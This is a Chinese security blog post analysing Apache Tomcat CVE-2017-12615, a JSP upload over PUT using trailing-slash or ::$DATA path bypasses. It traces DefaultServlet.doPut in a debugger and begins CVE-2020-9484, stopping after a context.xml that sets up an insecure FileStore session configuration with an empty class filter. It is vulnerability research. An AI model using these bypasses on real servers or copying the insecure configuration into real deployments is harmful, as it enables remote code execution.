@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="分析一下CVE-2017-12615和CVE-2020-9484">
+<title>Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析</title>
+
+<link rel='canonical' href='https://fupanc-w1n.github.io/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/'>
+
+<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析">
+<meta property='og:description' content="分析一下CVE-2017-12615和CVE-2020-9484">
+<meta property='og:url' content='https://fupanc-w1n.github.io/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/'>
+<meta property='og:site_name' content='fupanc'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-27T21:51:34&#43;08:00'/><meta property='article:modified_time' content='2025-09-27T21:51:34&#43;08:00'/>
+<meta name="twitter:title" content="Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析">
+<meta name="twitter:description" content="分析一下CVE-2017-12615和CVE-2020-9484">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fupanc</a></h1>
+            <h2 class="site-description">我与我周旋久，宁做我</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fupanc-w1n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#put文件上传漏洞">Put文件上传漏洞</a>
+      <ol>
+        <li><a href="#环境搭建及复现">环境搭建及复现</a></li>
+        <li><a href="#原理分析">原理分析</a></li>
+        <li><a href="#总结">总结</a></li>
+      </ol>
+    </li>
+    <li><a href="#session-反序列化代码执行漏洞">Session 反序列化代码执行漏洞</a>
+      <ol>
+        <li><a href="#持久化session是什么">持久化session是什么</a></li>
+        <li><a href="#环境搭建及复现-1">环境搭建及复现</a></li>
+        <li><a href="#原理分析-1">原理分析</a></li>
+        <li><a href="#总结-1">总结</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Java安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            分析一下CVE-2017-12615和CVE-2020-9484
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-09-27</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="tomcat-put文件上传和session-反序列化代码执行漏洞分析">Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析
+</h1><p>来分析一下CVE-2017-12615和CVE-2020-9484。</p>
+<h2 id="put文件上传漏洞">Put文件上传漏洞
+</h2><p>分析一下CVE-2017-12615。</p>
+<p><strong>漏洞版本</strong>：</p>
+<ul>
+<li>Tomcat 7.0.0 to 7.0.79</li>
+</ul>
+<p>似乎直到tomcat9也是存在的（主要是本文中提到的<code>/</code>绕过方式可用）。</p>
+<p><strong>漏洞利用条件</strong>：</p>
+<ul>
+<li>readonly设置为false，允许使用put文件上传。</li>
+</ul>
+<p>来调试分析一下这个漏洞的利用点。</p>
+<h3 id="环境搭建及复现">环境搭建及复现
+</h3><p>下载tomcat7.0.79并在idea上搭建好环境，jdk版本为8u71。</p>
+<p><strong>先来看一个基本知识</strong>，在tomcat源码目录的/conf/web.xml中，定义了对http请求的处理类：</p>
+<ul>
+<li>DefaultServlet类：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927165323148.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927165323148"
+	
+	
+></p>
+<p>这是一个所有web应用程序的默认servlet，它提供静态服务资源。</p>
+<ul>
+<li>JspServlet类：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927170946947.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927170946947"
+	
+	
+></p>
+<p>是一个处理jsp后缀的servlet类。</p>
+<p>映射情况如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927171117946.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927171117946"
+	
+	
+></p>
+<p>url中的<code>.jsp</code>和<code>.jspx</code>会交给DefaultServlet类处理，其余的就交给DefaultServlet类处理。</p>
+<p>搭建漏洞环境的话就加一个设置readonly为false即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927174849977.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927174849977"
+	
+	
+></p>
+<p>然后就可以启动环境了开打了。使用put创建文件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927180338038.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927180338038"
+	
+	
+></p>
+<p>可以看到成功上传，然后再访问就可以打命令执行了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927180425675.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927180425675"
+	
+	
+></p>
+<p>————————</p>
+<h3 id="原理分析">原理分析
+</h3><p>tomcat对put中的jsp文件上传有限制，故这里需要想方法调用到DefaultServlet来进行处理。</p>
+<p>在linux中可以如图在文件后面加一个<code>/</code>，而在windows环境中还可以使用空格（%20）或者<code>::$DATA</code>来绕过进入JspServlet。</p>
+<p>打断点于DefaultServlet类的doPut()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927182557822.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927182557822"
+	
+	
+></p>
+<p>在配置文件中我们将readOnly设置为false了，故这里不会调用sendError()抛出错误，下面的getRelativePath(req)就是获取uri中的去掉工程名的其余部分。</p>
+<p>再后面的resources.lookup(path)方法简单跟进就是看环境中是否有过这个的缓存？从结果来看就是之前加载过就为true，否则就进入catch将exists设置为false，这个变量在后续还是比较重要的。</p>
+<p>继续往后面看：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927210854761.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927210854761"
+	
+	
+></p>
+<p>这里比较重要的就是调用过的parseContentRange()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927210935406.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927210935406"
+	
+	
+></p>
+<p>可以看到是从请求头中找Content-Range，不存在就直接返回null，否则就会根据传的参数来截取文件上传的内容（这也是CVE-2025-24813的利用点），但是这里不涉及，直接看既定的链路。</p>
+<p>parseContentRange()返回null后，就会给range赋值为null，从而进入else语句接受全部的上传的文件内容。再往后看：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927211335991.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927211335991"
+	
+	
+></p>
+<p>如果之前加载过对应uri，那么exists就是true，跟进调用的rebind()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927211506326.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927211506326"
+	
+	
+></p>
+<p>继续跟进调用的rebind()方法，然后有调用了重载的rebind()方法，跟进如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927212032750.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927212032750"
+	
+	
+></p>
+<p>这里得base指向的就是应用程序目录下，故写入文件后直接就是可以访问的，这里值得一提的就是File类的初始化，在前面我们提到了通过在<code>/shell.jsp</code>后加一个<code>/</code>来绕过，重点就是这个File的初始化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927212704528.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927212704528"
+	
+	
+></p>
+<p>这里通过调用normalize()方法来修正了路径，故可以不影响后续操作，在这里完整拼接了一个路径+文件名。</p>
+<p>退出File类的初始化，然后调用streamContent()方法获取文件内容，再写入到文件中：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927213018141.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927213018141"
+	
+	
+></p>
+<p>通过FileOutputStream类来写文件，可以看到还有一个while循环来确保可以获取到所有内容。</p>
+<p>由此完整写入了一个文件。</p>
+<p>那么再简单看一下从零写入文件的过程，都大差不差的，讲讲不同点即可：</p>
+<p>没有加载过从而将exists设置为false：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927213749486.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927213749486"
+	
+	
+></p>
+<p>然后调用bind()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927213900796.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927213900796"
+	
+	
+></p>
+<p>再调用bind()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927213931612.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927213931612"
+	
+	
+></p>
+<p>然后同样的是再次调用重载的bind()方法，继续跟进：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927214041219.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927214041219"
+	
+	
+></p>
+<p>同样是直接经过修正后直接将shell.jsp拼接到web目录下看是否存在这个文件，这里不存在，故会调用rebind()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927214243181.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927214243181"
+	
+	
+></p>
+<p>后面就都是一样的了，最后写入文件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927214312599.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927214312599"
+	
+	
+></p>
+<p>——————————</p>
+<p>后面打断点看了一下base赋值的调用栈：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">setDocBase:127, FileDirContext (org.apache.naming.resources)
+</span></span><span class="line"><span class="cl">resourcesStart:5247, StandardContext (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">startInternal:5436, StandardContext (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">start:145, LifecycleBase (org.apache.catalina.util)
+</span></span><span class="line"><span class="cl">addChildInternal:899, ContainerBase (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">addChild:875, ContainerBase (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">addChild:652, StandardHost (org.apache.catalina.core)
+</span></span><span class="line"><span class="cl">manageApp:1899, HostConfig (org.apache.catalina.startup)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:497, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">invoke:301, BaseModelMBean (org.apache.tomcat.util.modeler)
+</span></span><span class="line"><span class="cl">invoke:819, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)
+</span></span><span class="line"><span class="cl">invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)
+</span></span><span class="line"><span class="cl">createStandardContext:618, MBeanFactory (org.apache.catalina.mbeans)
+</span></span><span class="line"><span class="cl">createStandardContext:565, MBeanFactory (org.apache.catalina.mbeans)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:497, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">invoke:301, BaseModelMBean (org.apache.tomcat.util.modeler)
+</span></span><span class="line"><span class="cl">invoke:819, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)
+</span></span><span class="line"><span class="cl">invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)
+</span></span><span class="line"><span class="cl">invoke:468, MBeanServerAccessController (com.sun.jmx.remote.security)
+</span></span><span class="line"><span class="cl">doOperation:1468, RMIConnectionImpl (javax.management.remote.rmi)
+</span></span><span class="line"><span class="cl">access$300:76, RMIConnectionImpl (javax.management.remote.rmi)
+</span></span><span class="line"><span class="cl">run:1309, RMIConnectionImpl$PrivilegedOperation (javax.management.remote.rmi)
+</span></span><span class="line"><span class="cl">doPrivileged:-1, AccessController (java.security)
+</span></span><span class="line"><span class="cl">doPrivilegedOperation:1408, RMIConnectionImpl (javax.management.remote.rmi)
+</span></span><span class="line"><span class="cl">invoke:829, RMIConnectionImpl (javax.management.remote.rmi)
+</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+</span></span><span class="line"><span class="cl">invoke:497, Method (java.lang.reflect)
+</span></span><span class="line"><span class="cl">dispatch:323, UnicastServerRef (sun.rmi.server)
+</span></span><span class="line"><span class="cl">run:200, Transport$1 (sun.rmi.transport)
+</span></span><span class="line"><span class="cl">run:197, Transport$1 (sun.rmi.transport)
+</span></span><span class="line"><span class="cl">doPrivileged:-1, AccessController (java.security)
+</span></span><span class="line"><span class="cl">serviceCall:196, Transport (sun.rmi.transport)
+</span></span><span class="line"><span class="cl">handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
+</span></span><span class="line"><span class="cl">run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+</span></span><span class="line"><span class="cl">lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+</span></span><span class="line"><span class="cl">run:-1, 548121275 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)
+</span></span><span class="line"><span class="cl">doPrivileged:-1, AccessController (java.security)
+</span></span><span class="line"><span class="cl">run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+</span></span><span class="line"><span class="cl">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
+</span></span><span class="line"><span class="cl">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
+</span></span><span class="line"><span class="cl">run:745, Thread (java.lang)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250927213417174.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250927213417174"
+	
+	
+></p>
+<p>通过调用FileDirContext类的setDocBase()方法来给base赋值，这里就是将其赋值为了web目录。</p>
+<h3 id="总结">总结
+</h3><p>从整个过程来看，仅从漏洞利用来看，其实并不复杂，改一个配置文件允许put文件上传即可，但是需要的是对tomcat运行架构的熟悉，比如为什么要使用到DefaultServlet类，put文件上传是怎么对jsp后缀的文件进行处理的，怎么绕过从而使用这个类，更重要的是需要知道这个类的doPut()方法的代码逻辑是什么，写入的文件位于哪里？都是需要考虑的。</p>
+<p>如何修复呢？</p>
+<p>当然将readonly设置为true就可以直接杜绝这种漏洞，那么高版本从代码逻辑上是否有修改呢，后续来看CVE-2025-24813的分析文章。</p>
+<h2 id="session-反序列化代码执行漏洞">Session 反序列化代码执行漏洞
+</h2><p>来说说CVE-2020-9484，同时借此来了解一下tomcat中对sesson的处理方式。需要注意的是后续还爆出来一个CVE-2021-25329，算是对CVE-2020-9484的补丁的绕过，但一直没有公开poc，这里不涉及。</p>
+<p>漏洞版本：</p>
+<ul>
+<li>10.0.0-M1 至 10.0.0-M4</li>
+<li>9.0.0.M1 至 9.0.34</li>
+<li>8.5.0 至 8.5.54</li>
+<li>7.0.0 至 7.0.103</li>
+</ul>
+<p>漏洞利用条件：</p>
+<ul>
+<li>攻击者能够控制服务器上的文件内容和名称</li>
+<li>服务器PersistenceManager配置中使用了FileStore</li>
+<li>服务器PersistenceManager配置中设置了sessionAttributeValueClassNameFilter为NULL，或者使用了其他较为宽松的过滤器，允许攻击者提供反序列化数据对象</li>
+<li>攻击者知道使用的FileStore存储位置到可控文件的相对文件路径</li>
+</ul>
+<p>接下来从漏洞知识点以及漏洞原理进行复现。</p>
+<h3 id="持久化session是什么">持久化session是什么
+</h3><p>tomcat通常通过两个session管理类来实现session的持久化：
+org.apache.catalina.session.StandardManager和org.apache.catalina.session.PersistentManager。</p>
+<p>这里主要谈谈PersistentManager类。session，被用于对当前会话的用户身份验证，并且session是存在有效期的，超过一定时间这个session就不再生效。那么持久化session是什么，顾名思义，就是让session持久化，PersistentManager类通常使用Store将活动会话交换到磁盘，如下几种情况可以用到持久化session：</p>
+<ul>
+<li>跨容器的重新启动持久化会话。</li>
+<li>容错性，将会话备份在磁盘上，以便在容器<strong>意外重启或宕机</strong>的情况下进行恢复。</li>
+<li>通过将活动较少的会话交换到磁盘来限制内存中保留的活动会话的数量。比如当前用户的访问量巨大，大量的session会占用服务器大量的内存，此时就可以将较长时间没使用的session存储至磁盘，用以节省空间。</li>
+</ul>
+<p>如何存储的呢，<strong>序列化对应的session对象再存储</strong>，也就是需要对应的session对象需要实现Serializable接口。</p>
+<p>Store有两种 FileStore 和 JDBCStore，FileStore是将session对象存储到文件中，JDBCStore则是存储到数据库中。从漏洞利用角度来看，这里要利用到FileStore。</p>
+<h3 id="环境搭建及复现-1">环境搭建及复现
+</h3><p>先在idea上搭建一个tomcat9.0.20环境，然后在tomcat源码/conf/context.xml文件中添加如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Manager</span> <span class="na">className=</span><span class="s">&#34;org.apache.catalina.session.PersistentManager&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="na">saveOnRestart=</span><span class="s">&#34;true&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="na">sessionAttributeValueClassNameFilter=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Store</span> <span class="na">className=</span><span class="s">&#34;org.apache.catalina.session.FileStore&#34;</span> <span class="na">directory=</span><span class="s">&#34;./sessions&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Manager&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250926180605619.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250926180605619"
+	
+	
+></p>
